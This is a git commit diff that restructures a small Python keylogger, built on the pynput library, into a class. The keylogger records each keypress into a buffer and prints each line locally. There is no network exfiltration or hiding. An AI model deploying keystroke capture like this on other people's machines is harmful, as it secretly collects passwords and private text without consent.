691792ef43ced33efbc7f781764430a4e0625ad5
Tarcísio Marinho <tarcisio_marinho09@hotmail.com>
2019-07-29 18:38:56 -0300

    basic class structure

--- keylogger.py
+++ keylogger.py
@@ -2,30 +2,50 @@ from pynput import keyboard
 import pynput
 # https://github.com/moses-palmer/pynput/issues/20
 
-buffer = []
-buffer_size = 0
+
+class logger:
+
+    def __init__(self):
+
+        # WORK AS STACK -> BACKSPACE = POP
+        self.__buffer = []
+        self.__buffer_size = 0
+        self.__listener = None
 
 
-def write_to_buffer(key, buffer, buffer_size):
-    if(buffer_size == 1024 or key == pynput.keyboard.Key.enter):
-        buffer.append("\n")
-        print(''.join(buffer))
-        buffer = []
-    else:
-        if(key == pynput.keyboard.Key.space):
-            buffer.append(" ")
+    def run(self):
+        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as self.__listener:
+            self.__listener.join()
+
+
+    def write_to_buffer(self, key):
+        if(self.__buffer_size == 1024 or key == pynput.keyboard.Key.enter):
+            self.__buffer.append("\n")
+            print(''.join(self.__buffer))
+            self.__buffer = []
         else:
-            buffer.append(str(key).replace("'", ""))
+            if(key == pynput.keyboard.Key.space):
+                self.__buffer.append(" ")
+            else:
+                self.__buffer.append(str(key).replace("'", ""))
+        
+        # Stop keylogger
+        # if(CONDITION):
+        #     self.stop()
 
-    buffer_size += 1
+        self.__buffer_size += 1
 
-def on_press(key):
-    write_to_buffer(key, buffer, buffer_size)
+    def on_press(self, key):
+        self.write_to_buffer(key)
 
-def on_release(key):
-    pass
+    def on_release(self, key):
+        pass
+    
+    def stop(self):
+        self.__listener.close()
+
 
 if __name__ == "__main__":
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-
+    
+    l = logger()
+    l.run()
